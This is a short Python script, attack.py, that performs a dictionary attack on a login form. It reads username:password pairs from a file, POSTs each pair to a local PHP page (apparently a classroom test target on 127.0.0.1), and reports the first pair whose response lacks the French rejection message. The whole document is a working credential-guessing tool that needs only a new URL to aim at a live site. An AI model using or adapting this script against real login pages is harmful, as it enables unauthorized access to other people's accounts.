#coding: utf-8
import requests

try:
    file = open('dictionnary.txt', 'r')
except:
    print('attack.py : Error script connot open dictionnary check if the path are \'.\'')
    exit()

username = []
password = []

for line in file:
    separator = line.find(':')
    carriageReturn = line.find("\n")

    if separator != -1 and carriageReturn != -1:
        username.append(line[:separator])
        password.append(line[separator+1:carriageReturn])

print('Send HTTP Post request...')
i = 0 
isFind = False
while i < len(username) and not isFind:
    print('Attack > {}:{}'.format(username[i], password[i]))
    http = requests.post('http://127.0.0.1/AttaqueParDictionnaire/script.php', data={'username' : username[i], 'password' : password[i]})

    if http.text.find('Vous êtes un imposteur ! La police vien vous chercher !') == -1:
        print('attack.py Successfully :')
        print(http.text)
        print('Attack > Find the information {}:{}'.format(username[i], password[i]))
        isFind = True
    i+=1

file.close() 
